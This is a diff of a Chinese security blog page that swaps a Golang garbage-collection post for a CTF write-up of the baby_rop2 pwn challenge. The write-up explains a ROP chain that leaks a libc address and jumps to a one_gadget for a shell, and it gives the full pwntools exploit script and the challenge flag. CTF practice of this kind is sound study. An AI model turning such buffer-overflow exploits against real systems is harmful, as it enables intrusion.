@@ -4,7 +4,7 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="Golang 垃圾回收剖析, HeliantHuS,Python,Golang,CTF,网络安全,AWD,服务器,运维">
+    <meta name="keywords" content="【CTF-PWN】ROP + One_gadget拿shell, HeliantHuS,Python,Golang,CTF,网络安全,AWD,服务器,运维">
     <meta name="description" content="每个人都有一片属于自己的森林，迷失的人迷失了，相逢的人会再相逢.">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Golang 垃圾回收剖析 | HeliantHuS&#39;s Blog</title>
+    <title>【CTF-PWN】ROP + One_gadget拿shell | HeliantHuS&#39;s Blog</title>
     <link rel="icon" type="image/jpeg" href="https://miscpic.oss-cn-qingdao.aliyuncs.com/images/touxiang.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -280,12 +280,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/images/11/banner.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://miscpic.oss-cn-qingdao.aliyuncs.com/blog/featureimages/22.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Golang 垃圾回收剖析</h1>
+                    <h1 class="description center-align post-title">【CTF-PWN】ROP + One_gadget拿shell</h1>
                 </div>
             </div>
         </div>
@@ -406,12 +406,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Golang/">
-                                <span class="chip bg-color">Golang</span>
+                            <a href="/tags/pwn/">
+                                <span class="chip bg-color">pwn</span>
                             </a>
                         
-                            <a href="/tags/Gc/">
-                                <span class="chip bg-color">Gc</span>
+                            <a href="/tags/rop/">
+                                <span class="chip bg-color">rop</span>
                             </a>
                         
                     </div>
@@ -422,8 +422,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Golang/" class="post-category">
-                                Golang
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
                             </a>
                         
                     </div>
@@ -435,21 +435,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-03-09
+                    2020-06-20
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-05-27
+                    2020-06-20
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    78
+                    352
                 </div>
                 
 
@@ -466,11 +466,56 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>这一小节介绍三种经典的 GC 算法：引用计数（reference counting）、标记-清扫（mark &amp; sweep）、节点复制（Copying Garbage Collection），分代收集（Generational Garbage Collection）。</p>
+                <p>记录一下在题目中one_gadget的使用, one_gadget永远滴神.</p>
 <a id="more"></a>
 
+<h2 id="0x01-题目地址"><a href="#0x01-题目地址" class="headerlink" title="0x01 题目地址"></a>0x01 题目地址</h2><p><a href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2" target="_blank" rel="noopener">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2</a></p>
+<h2 id="0x02-开始梭哈"><a href="#0x02-开始梭哈" class="headerlink" title="0x02 开始梭哈"></a>0x02 开始梭哈</h2><p>题目给了一个<code>babyrop2</code>和一个<code>libc.so.6</code>, 先分析一下这个<code>babyrop2</code>.</p>
+<h5 id="babyrop2"><a href="#babyrop2" class="headerlink" title="babyrop2"></a>babyrop2</h5><p>程序就一个输入点<br><img src="/images/18/1.jpg" alt></p>
+<p>打算使用<code>printf</code>函数泄露出<code>__libc_start_main</code>的地址. (确实没有找到合适泄露的函数, 只能这个了…)<br><img src="/images/18/2.jpg" alt></p>
+<p>也就是要构造一个<code>printf(&quot;%s&quot;, __libc_start_main的got地址)</code><br>先找到<code>%s</code><br><img src="/images/18/3.jpg" alt></p>
+<p>截取到<code>%s</code>开始, 也就是<br><img src="/images/18/4.jpg" alt></p>
+<p><code>__libc_start_main</code>的<code>got</code>就不用多说了.</p>
+<p>接下来从<code>libc.so.6</code>里面得到一些信息</p>
+<h5 id="libc-so-6"><a href="#libc-so-6" class="headerlink" title="libc.so.6"></a>libc.so.6</h5><p>我们要从这个文件中得到<code>one_gadget</code>, 需要借助一个工具, 就叫<code>one_gadget</code>.<br><img src="/images/18/5.jpg" alt></p>
+<p><code>one_gadget</code>是什么呢? 就是我们以往做<code>ROP</code>需要泄露地址然后拿到真实的<code>system</code>函数以及<code>bin_sh</code>字符串的地址构造<code>ROP</code>, 但是当有了<code>one_gadget</code>, 就可以直接返回到这个地址拿到<code>shell</code>.</p>
+<h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
-<p>直接看大佬的文章, 讲的超级超级详细！！！<br><a href="http://legendtkl.com/2017/04/28/golang-gc/" target="_blank" rel="noopener">Golang 垃圾回收剖析</a><br><a href="http://legendtkl.com/2017/04/28/golang-gc/" target="_blank" rel="noopener">Golang 垃圾回收剖析</a><br><a href="http://legendtkl.com/2017/04/28/golang-gc/" target="_blank" rel="noopener">Golang 垃圾回收剖析</a></p>
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./babyrop2"</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># p = remote("node3.buuoj.cn", 29305)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./babyrop2"</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
+
+<span class="token comment" spellcheck="true"># var</span>
+overflow <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span>
+format_string <span class="token operator">=</span> <span class="token number">0x400790</span>
+pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000400733</span>
+pop_rsi_r15 <span class="token operator">=</span> <span class="token number">0x0000000000400731</span>
+printf_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>
+libc_start_main_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span>
+main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span>
+
+payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflow
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>format_string<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_start_main_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+success<span class="token punctuation">(</span><span class="token string">"libc_start_main: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+libc_base <span class="token operator">=</span> leak_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span>
+
+payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflow
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x45216</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p><img src="/images/18/6.jpg" alt></p>
+<p>emm, 这题目<code>flag</code>竟然没放到根目录, 还要找一下才可以QAQ</p>
+<p><code>flag{23d424ad-f38b-4a47-a60f-41ca5c19fb88}</code></p>
 
             </div>
             <hr/>
@@ -496,7 +541,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://helianthus.top/2020/03/10/11-Golang-Gc/">https://helianthus.top/2020/03/10/11-Golang-Gc/</a>
+                    <a href="https://helianthus.top/2020/06/20/18-buuoj-babyrop2/">https://helianthus.top/2020/06/20/18-buuoj-babyrop2/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -534,12 +579,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Golang/">
-                                    <span class="chip bg-color">Golang</span>
+                                <a href="/tags/pwn/">
+                                    <span class="chip bg-color">pwn</span>
                                 </a>
                             
-                                <a href="/tags/Gc/">
-                                    <span class="chip bg-color">Gc</span>
+                                <a href="/tags/rop/">
+                                    <span class="chip bg-color">rop</span>
                                 </a>
                             
                         </div>
@@ -710,7 +755,7 @@
         repo: 'l-helianthus.github.io',
         owner: 'L-HeliantHuS',
         admin: ["L-HeliantHuS"],
-        id: '2020-03-09T22-05-37',
+        id: '2020-06-20T14-59-27',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -734,35 +779,92 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/05/11/12-wangdingCUP-bang-reverse/">
+                <a href="/2020/06/20/18-buuoj-babyrop2/">
                     <div class="card-image">
                         
-                        <img src="/images/12/jadx.jpg" class="responsive-img" alt="2020网鼎杯 安卓逆向 bang">
                         
-                        <span class="card-title">2020网鼎杯 安卓逆向 bang</span>
+                        <img src="https://miscpic.oss-cn-qingdao.aliyuncs.com/blog/featureimages/22.jpg" class="responsive-img" alt="【CTF-PWN】ROP + One_gadget拿shell">
+                        
+                        <span class="card-title">【CTF-PWN】ROP + One_gadget拿shell</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            参加了一下网鼎杯, 太难了…QAQ, 赛后根据大佬的思路重新做了一遍题目, 记录一下…
+                            记录一下在题目中one_gadget的使用, one_gadget永远滴神.
 
 
-Setup
-Python3
-Jadx-GUI
-Frida  (python -m pip install frida-tools)
-Frida-se
+0x01 题目地址https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2
+0x02 开始梭哈题目给了一个
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-05-11
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-06-20
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                    <a href="/tags/rop/">
+                        <span class="chip bg-color">rop</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/06/03/17-buuoj-misc-writeup/">
+                    <div class="card-image">
+                        
+                        <img src="/images/8/1.jpg" class="responsive-img" alt="BUUOJ CTF Misc题目WriteUP">
+                        
+                        <span class="card-title">BUUOJ CTF Misc题目WriteUP</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            BUUOJ CTF, 日常刷题记录, 包含题目flag, 以及使用的脚本. 
+这是关于杂项题目的WP, 之前写过密码学的WP, 如果有需要可以转到BUUCTF 密码学思路
+
+
+签到emm, 直接给flag了。flag{buu_ctf}
+金三
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-06-02
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -778,80 +880,24 @@ Frida-se
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Android/">
-                        <span class="chip bg-color">Android</span>
-                    </a>
-                    
-                    <a href="/tags/Reverse/">
-                        <span class="chip bg-color">Reverse</span>
-                    </a>
-                    
                     <a href="/tags/CTF/">
                         <span class="chip bg-color">CTF</span>
                     </a>
                     
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/02/14/10-ElasticSearch-Quick-Start/">
-                    <div class="card-image">
-                        
-                        <img src="/images/10/bowser.png" class="responsive-img" alt="ElasticSearch Centos7安装教程">
-                        
-                        <span class="card-title">ElasticSearch Centos7安装教程</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            ElasticSearch是一个采用Java语言编写搜索服务器，提供了一个分布式多用户的全文搜索引擎，能够达到实时搜索，稳定，可靠，快速，安装使用方便。
-
-
-环境说明Centos7必须能连接互联网
-[root@localhost ~]# c
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-13
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/Linux/" class="post-category">
-                                    Linux
-                                </a>
-                            
-                            <a href="/categories/Linux/ElasticSearch/" class="post-category">
-                                    ElasticSearch
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/ES/">
-                        <span class="chip bg-color">ES</span>
+                    <a href="/tags/BUUCTF/">
+                        <span class="chip bg-color">BUUCTF</span>
                     </a>
                     
-                    <a href="/tags/ElasticSearch/">
-                        <span class="chip bg-color">ElasticSearch</span>
+                    <a href="/tags/BUUOJ/">
+                        <span class="chip bg-color">BUUOJ</span>
                     </a>
                     
-                    <a href="/tags/Centos/">
-                        <span class="chip bg-color">Centos</span>
+                    <a href="/tags/Misc/">
+                        <span class="chip bg-color">Misc</span>
+                    </a>
+                    
+                    <a href="/tags/WriteUP/">
+                        <span class="chip bg-color">WriteUP</span>
                     </a>
                     
                 </div>
